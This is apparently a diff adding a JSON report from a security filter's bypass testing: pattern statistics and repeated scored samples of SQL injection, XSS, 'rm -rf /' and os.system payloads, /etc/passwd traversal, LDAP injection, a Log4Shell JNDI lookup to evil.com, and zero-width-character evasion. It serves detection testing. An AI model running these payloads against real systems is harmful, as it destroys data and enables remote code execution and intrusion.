@@ -1,0 +1,2915 @@
+{
+  "statistics": {
+    "total_bypasses": 152,
+    "pattern_frequency": {
+      "high_special_char_ratio": 84,
+      "sql_keywords": 44,
+      "fragmented_words": 16,
+      "zero_width_characters": 12,
+      "control_characters": 12,
+      "high_unicode_ratio": 12,
+      "character_repetition": 12,
+      "base64_like": 12
+    },
+    "category_distribution": {
+      "character_manipulations": [
+        [
+          "zero_width_characters",
+          12
+        ],
+        [
+          "control_characters",
+          12
+        ],
+        [
+          "high_unicode_ratio",
+          12
+        ],
+        [
+          "character_repetition",
+          12
+        ]
+      ],
+      "encoding_patterns": [
+        [
+          "base64_like",
+          12
+        ]
+      ],
+      "semantic_patterns": [
+        [
+          "high_special_char_ratio",
+          84
+        ],
+        [
+          "sql_keywords",
+          44
+        ],
+        [
+          "fragmented_words",
+          16
+        ]
+      ]
+    }
+  },
+  "analyzed_samples": [
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "DROP TABLE users;",
+      "length": 17,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 17,
+        "entropy": 3.85
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.9
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "rm -rf /",
+      "length": 8,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 8,
+        "entropy": 2.5
+      },
+      "detected_patterns": [],
+      "risk_score": 0.6
+    },
+    {
+      "original": "import os; os.system('rm -rf /')",
+      "length": 32,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 32,
+        "entropy": 3.93
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.8
+    },
+    {
+      "original": "exec('rm -rf /')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.5
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.9
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.6
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.8
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.9
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.6
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.8
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.9
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.6
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.8
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.55
+    },
+    {
+      "original": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "length": 44,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 44,
+        "entropy": 3.71
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.6
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.9
+    },
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP TABLE users;",
+      "length": 17,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 17,
+        "entropy": 3.85
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP TABLE users;",
+      "length": 17,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 17,
+        "entropy": 3.85
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm -rf /",
+      "length": 8,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 8,
+        "entropy": 2.5
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import os; os.system('rm -rf /')",
+      "length": 32,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 32,
+        "entropy": 3.93
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm -rf /')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.5
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
+          "\u200b"
+        ],
+        "control_characters": [
+          "\u200b"
+        ],
+        "high_unicode_ratio": 1.0
+      },
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 6,
+        "entropy": 2.25
+      },
+      "detected_patterns": [
+        "zero_width_characters",
+        "control_characters",
+        "high_unicode_ratio",
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "length": 100,
+      "character_manipulations": {
+        "character_repetition": true
+      },
+      "encoding_patterns": {
+        "base64_like": 100
+      },
+      "semantic_patterns": {},
+      "structure": {
+        "length": 100,
+        "entropy": -0.0
+      },
+      "detected_patterns": [
+        "character_repetition",
+        "base64_like"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "SELECT * FROM users WHERE id=1 OR 1=1",
+      "length": 37,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "fragmented_words": 1,
+        "sql_keywords": [
+          "SELECT",
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 37,
+        "entropy": 4.04
+      },
+      "detected_patterns": [
+        "fragmented_words",
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "DROP  TABLE  users;",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "DROP"
+        ]
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 3.72
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "<script>alert('xss')</script>",
+      "length": 29,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3103448275862069
+      },
+      "structure": {
+        "length": 29,
+        "entropy": 3.84
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "rm  -rf  /",
+      "length": 10,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {},
+      "structure": {
+        "length": 10,
+        "entropy": 2.32
+      },
+      "detected_patterns": [],
+      "risk_score": 0.0
+    },
+    {
+      "original": "import  os;  os.system('rm  -rf  /')",
+      "length": 36,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "sql_keywords": [
+          "OR"
+        ]
+      },
+      "structure": {
+        "length": 36,
+        "entropy": 3.77
+      },
+      "detected_patterns": [
+        "sql_keywords"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "../../../etc/passwd",
+      "length": 19,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.5263157894736842
+      },
+      "structure": {
+        "length": 19,
+        "entropy": 2.91
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "*)(uid=*))(|(uid=*",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.6666666666666666
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 2.93
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "${jndi:ldap://evil.com/a}",
+      "length": 25,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.36
+      },
+      "structure": {
+        "length": 25,
+        "entropy": 4.05
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "eval('alert(1)')",
+      "length": 16,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.375
+      },
+      "structure": {
+        "length": 16,
+        "entropy": 3.25
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "exec('rm  -rf  /')",
+      "length": 18,
+      "character_manipulations": {},
+      "encoding_patterns": {},
+      "semantic_patterns": {
+        "high_special_char_ratio": 0.3333333333333333
+      },
+      "structure": {
+        "length": 18,
+        "entropy": 3.39
+      },
+      "detected_patterns": [
+        "high_special_char_ratio"
+      ],
+      "risk_score": 0.0
+    },
+    {
+      "original": "\u200b\u9690\u85cf\u200b\u5b57\u7b26",
+      "length": 6,
+      "character_manipulations": {
+        "zero_width_characters": [
